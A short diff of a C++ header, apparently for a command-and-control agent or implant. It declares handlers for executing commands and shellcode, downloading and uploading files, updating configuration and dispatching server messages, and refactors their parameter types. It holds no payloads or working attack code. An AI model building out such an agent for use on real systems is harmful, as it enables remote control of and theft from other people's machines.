@@ -40,16 +40,16 @@ public:
 
 	//bool receiveMessages(uint8_t* buffer, size_t bytes_received);
 
-	bool executeCommand(std::vector<uint8_t>& data);
-	//bool executeShellcode(std::vector<uint8_t>& data);
+	bool executeCommand(RawByteBuffer& data);
+	//bool executeShellcode(RawByteBuffer& data);
 	bool executeShellcode(InternalMessage& msg);
 
-	bool downloadFile(std::vector<uint8_t>& data);
+	bool downloadFile(RawByteBuffer& data);
 	//bool executeFile();
-	bool uploadFile(std::vector<uint8_t>& data);
-	bool updateConfig(std::vector<uint8_t>& data);
-	bool handleServerError(std::vector<uint8_t>& data);
-	bool systemInfo(InternalMessage& msg);
+	bool uploadFile(RawByteBuffer& data);
+	bool updateConfig(RawByteBuffer& data);
+	bool handleServerError(RawByteBuffer& data);
+	//bool systemInfo(InternalMessage& msg);
 
 	// Processes an InternalMessage and use the messageHandler_ based on the InternalMessage's messageType
 	void processMessage(InternalMessage& msg);
